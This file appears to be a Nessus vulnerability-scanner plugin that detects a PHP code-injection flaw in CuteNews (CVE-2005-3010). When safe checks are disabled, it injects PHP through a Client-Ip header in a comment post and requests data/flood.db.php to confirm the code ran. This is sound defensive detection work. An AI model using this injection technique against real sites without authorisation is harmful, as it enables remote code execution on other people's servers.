#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(19756);
  script_version ("$Revision: 1.23 $");

  script_cve_id("CVE-2005-3010");
  script_bugtraq_id(14869);
  script_osvdb_id(19478);

  script_name(english:"CuteNews flood.db.php Client-IP HTTP Header Arbitrary Code Injection");

 script_set_attribute(attribute:"synopsis", value:
"The remote website contains a PHP script that allows for arbitrary
PHP code execution." );
 script_set_attribute(attribute:"description", value:
"The version of CuteNews installed on the remote host fails to properly
sanitize the IP addresses of clients using the system before logging
them to a known file.  An attacker can exploit this flaw to inject
arbitrary PHP code through a Client-IP request header and then execute
that code by requesting 'data/flood.db.php'." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/Sep/211" );
 script_set_attribute(attribute:"solution", value:
"Restrict access to CuteNews' data directory; eg, using a .htaccess
file." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/09/19");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/09/17");
 script_cvs_date("$Date: 2017/05/11 13:46:37 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

  script_summary(english:"Checks for Client-IP header code injection vulnerability in CuteNews");
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2017 Tenable Network Security, Inc.");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_dependencies("cutenews_detect.nasl");
  script_require_keys("www/cutenews");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/cutenews"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # Try to exploit the flaw if safe checks are not enabled.
  #
  # nb: this won't work if CuteNews doesn't allow comments
  #     for the article id we pick.
  if (!safe_checks()) {
    # Get the main page where articles are listed
    #
    # nb: example{1,2}.php are default examples.
    r = http_send_recv3(method:"GET",item:string(dir, "/example2.php"), port:port);
    if (isnull(r)) exit(0);
    res = r[2];

    # Identify an article id.
    pat = "subaction=showcomments&amp;id=([^&]+)&";
    matches = egrep(pattern:pat, string:res);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        id = eregmatch(pattern:pat, string:match);
        if (!isnull(id)) {
          id = id[1];
          break;
        }
      }
    }

    # If we have a thread id...
    if (!isnull(id)) {
      # Define a message to be echoed back to us.
      msg = rand_str(length:20);

      # First we need to inject some code by posting a comment.
      #
      # nb: this _will_ show up in the news script!
      postdata = string(
        "name=Nessus&",
        "mail=&",
        "comments=", urlencode(str:string("Test from ", SCRIPT_NAME)), "&",
        "subaction=addcomment"
      );
      u = strcat(
      	  dir, "/example2.php?",
          "subaction=showcomments&",
          "id=", id, "&",
          "archive=&",
          "start_from=&",
          "ucat=1&",
          "script=", SCRIPT_NAME);
      r = http_send_recv3(method: "POST",  item: u, data: postdata, port: port,
      	add_headers: make_array( "Client-Ip", strcat("<?php echo '", msg, "'; ?>"),
		     		 "Content-Type", "application/x-www-form-urlencoded"));
      if (isnull(r)) exit(0);

      # Now check for the exploit.
      r = http_send_recv3(method:"GET", item:string(dir, "/data/flood.db.php"), port:port);
      if (isnull(r)) exit(0);
      res = r[2];

      # There's a problem if our message was echoed back to us.
      if (msg >< res) {
        security_hole(port);
        exit(0);
      }
    }
    else {
      debug_print("couldn't find an article id to use!", level:1);
    }
  }

  # Check the version number in case safe checks were enabled or
  # comments for the selected article were not allowed.
  #
  # nb: 1.4.0 and below are affected.
  if (ver =~ "^(0.*|1\.([0-3].*|4\.0($|[^0-9])))") {
    report = string(
    );
    security_hole(port:port, extra:
"Note that Nessus has determined the vulnerability exists on the remote
host simply by looking at the version number of CuteNews installed there.");
    exit(0);
  }
}
